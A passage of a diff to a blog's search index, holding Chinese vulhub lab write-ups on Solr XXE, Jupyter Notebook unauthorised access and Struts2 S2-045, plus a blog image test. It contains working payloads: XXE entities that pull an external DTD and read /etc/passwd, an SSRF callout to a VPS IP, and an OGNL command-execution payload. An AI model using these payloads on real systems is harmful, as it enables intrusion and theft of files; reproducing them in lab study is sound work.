</span>mLvnBZTNP4mtS=5Z6BRWE9ckgj5fVytACBSQ8aUystMk7Xqg5ADwRXx9DCR4ti2XwAEqlXYac1OobPa1mooZWhy38M7.LkRxVTZoq; _xsrf=2|cc5a6916|387e0088d1426ad0f563ffb88c9227eb|1700298115<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>www.google.com<br></code></pre></td></tr></table></figure>
+
+<p>在宿主机的cmd窗口输入<code>python -m http.server 6666</code>或者<code>nc -lvp 6666</code></p>
+<p>监听6666端口</p>
+<img src="https://images.gaifagafin.top/202311222302835.png" style="zoom:80%;" />
+
+<img src="https://images.gaifagafin.top/202311222303032.png" style="zoom:80%;" />
+
+<p>将构造的http请求发送</p>
+<img src="https://images.gaifagafin.top/202311222303090.png" style="zoom:80%;" />
+
+<p>由于这是<strong>blind XXE</strong>，页面不会回显，但刚刚创建的http服务器可以收到请求</p>
+<img src="https://images.gaifagafin.top/202311222303346.png" style="zoom:80%;" />
+
+<p>使用<code>nc</code>监听也可以收到java请求，内容更详细</p>
+<img src="https://images.gaifagafin.top/202311222303643.png" style="zoom:80%;" />
+
+<p>接下来利用<strong>Error Based XXE</strong>读取文件</p>
+<p>首先在宿主机www目录下新建1.dtd,写入下面内容读取&#x2F;etc文件夹内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;file:///etc&quot;&gt;<br>&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &#x27;:%file;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p>构造payload：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span>[<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ext</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.137.1:8888/1.dtd&quot;</span>&gt;</span>%ext;%ent;]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">r</span>&gt;</span><span class="hljs-symbol">&amp;data;</span><span class="hljs-tag">&lt;/<span class="hljs-name">r</span>&gt;</span>&amp;wt=xml&amp;defType=xmlparser<br></code></pre></td></tr></table></figure>
+
+<p>将payload进行url编码：</p>
+<img src="https://images.gaifagafin.top/202311222303378.png" style="zoom:80%;" />
+
+<p>发送请求后，成功读取到<code>/etc</code>文件夹内容</p>
+<img src="https://images.gaifagafin.top/202311222303592.png" style="zoom:80%;" />
+
+<h1 id="SSRF利用-VPS接收请求"><a href="#SSRF利用-VPS接收请求" class="headerlink" title="SSRF利用(VPS接收请求)"></a>SSRF利用(VPS接收请求)</h1><p>基于漏洞复现中的内容，直接构造payload：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://47.109.111.193:6666&quot;</span>&gt;</span>%remote;]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">root</span>/&gt;</span>&amp;wt=xml&amp;defType=xmlparser<br></code></pre></td></tr></table></figure>
+
+<p>将payload进行url编码：</p>
+<img src="https://images.gaifagafin.top/202311222303570.png" style="zoom:80%;" />
+
+<p>发送请求后，在VPS服务器上接收到请求</p>
+<img src="https://images.gaifagafin.top/202311222303536.png" style="zoom:80%;" />
+
+<h1 id="读取-etc-passwd"><a href="#读取-etc-passwd" class="headerlink" title="读取&#x2F;etc&#x2F;passwd"></a>读取&#x2F;etc&#x2F;passwd</h1><p>将<code>1.dtd</code>中的内容改成：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &#x27;:%file;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p>构造payload：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span>[<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ext</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.137.1:8888/1.dtd&quot;</span>&gt;</span>%ext;%ent;]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">r</span>&gt;</span><span class="hljs-symbol">&amp;data;</span><span class="hljs-tag">&lt;/<span class="hljs-name">r</span>&gt;</span>&amp;wt=xml&amp;defType=xmlparser<br></code></pre></td></tr></table></figure>
+
+<p>将payload进行url编码：</p>
+<img src="https://images.gaifagafin.top/202311222303053.png" style="zoom:80%;" />
+
+<p>发送请求，成功读取etc&#x2F;passwd</p>
+<img src="https://images.gaifagafin.top/202311222303452.png" style="zoom:80%;" />
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Jupyter Notebook 未授权访问漏洞</title>
+    <url>/2023/11/22/Jupyter-Notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Jupyter Notebook 未授权访问漏洞</p>
+<ol>
+<li>复现环境中的未授权访问漏洞，登录Jupyter Web管理界面，截图证明</li>
+<li>利用Jupyter Notebook控制台执行系统命令，读取&#x2F;etc&#x2F;passwd内容，提供截图</li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>运行测试环境：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker compose up -d<br></code></pre></td></tr></table></figure>
+
+<p>运行后，访问<code>http://your-ip:8888</code>将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>选择 new -&gt; terminal 即可创建一个控制台：</p>
+<img src="https://images.gaifagafin.top/202311222307962.png" style="zoom:67%;" />
+
+<p>可以直接执行任意命令：</p>
+<img src="https://images.gaifagafin.top/202311222307718.png" style="zoom:80%;" />
+
+<h1 id="读取-etc-passwd内容"><a href="#读取-etc-passwd内容" class="headerlink" title="读取&#x2F;etc&#x2F;passwd内容"></a>读取&#x2F;etc&#x2F;passwd内容</h1><img src="https://images.gaifagafin.top/202311222307464.png" style="zoom:80%;" />
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)</title>
+    <url>/2023/11/22/Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-5638/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)</p>
+<ol>
+<li>复现环境中的OGNL表达式注入漏洞，截图证明</li>
+<li>尝试利用漏洞执行系统命令，读取当前目录下的pom.xml内容，提供截图</li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>执行如下命令启动struts2 2.3.30：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker compose up -d<br></code></pre></td></tr></table></figure>
+
+<p>环境启动后，访问<code>http://your-ip:8080</code>即可看到上传页面。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;vulhub&#x27;,233*233)&#125;.multipart/form-data<br></code></pre></td></tr></table></figure>
+
+<p>将payload放在<code>Content-Type</code>后面发送数据包，可见<code>233*233</code>已成功执行：</p>
+<img src="https://images.gaifagafin.top/202311222309291.png" alt="回显" style="zoom:80%;" />
+
+<h1 id="读取pom-xml"><a href="#读取pom-xml" class="headerlink" title="读取pom.xml"></a>读取pom.xml</h1><p>构造payload，<code>cmd=</code>后面的内容改成<code>&#39;cat pom.xml&#39;</code>，将payload放在<code>Content-Type</code>后面发送数据包</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;cat pom.xml&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;<br></code></pre></td></tr></table></figure>
+
+<p>读取到pom.xml的内容，箭头所指的cmd里面可以放任意指令</p>
+<p><img src="https://images.gaifagafin.top/202311222309513.png"></p>
+<p>进入容器验证，成功读取</p>
+<p><img src="https://images.gaifagafin.top/202311222309452.png"></p>
+<hr>
+<p>参考链接：<a href="https://www.jianshu.com/p/30f438eee93e">https://www.jianshu.com/p/30f438eee93e</a></p>
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>博客内容测试</title>
+    <url>/2023/10/29/%E5%8D%9A%E5%AE%A2%E5%86%85%E5%AE%B9%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<p><img src="https://s2.loli.net/2023/10/29/vjYu7sqMi8dgQbK.jpg" alt="SM.MS"></p>
+<p><img src="https://s2.loli.net/2023/10/29/Hns3KL4TP2qQm9f.jpg" alt="SM.MS"></p>
+<p><img src="https://s3.uuu.ovh/imgs/2023/11/02/e9d94fc61d21d30a.jpg" alt="ImgUrl"></p>
+<p><img src="https://img.gaifagafin.top/202311041048278.jpg" alt="CloudFlare R2"></p>
+<p><img src="https://images.gaifagafin.top/202311051019789.jpg" alt="cloudflare R2"></p>
+<p><img src="https://images.gaifagafin.top/202311051020956.png" alt="cloudflare R2"></p>
+<p><img src="https://img.gaifagafin.top/wallhaven-3z2k6y.jpg" alt="backbazeb2 8.8MB"></p>
+<p><img src="https://img.gaifagafin.top/wallhaven-72eq5o.jpg" alt="backbazeb2 7.7MB"></p>
+<p><img src="https://img.gaifagafin.top/gaifagafin.jpg" alt="backbazeb2 189KB"></p>
+<p>视频插入测试，代码为：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: relative; width: 100%; height: 0; padding-bottom: 75%;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> </span><br><span class="hljs-tag"><span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//player.bilibili.com/player.html?aid=534928147&amp;bvid=BV1dM41197wb&amp;cid=1307621987&amp;p=1&quot;</span>  <span class="hljs-attr">scrolling</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> </span><br><span class="hljs-tag"><span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">framespacing</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">allowfullscreen</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: absolute; width: 100%; </span></span><br><span class="hljs-string"><span class="hljs-tag">height: 100%; left: 0; top: 0;&quot;</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe 
+src="//player.bilibili.com/player.html?aid=534928147&bvid=BV1dM41197wb&cid=1307621987&p=1"  scrolling="no" border="0" 
+frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; 
+height: 100%; left: 0; top: 0;"> </iframe></div>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>picture</tag>
       </tags>
   </entry>
 </search>
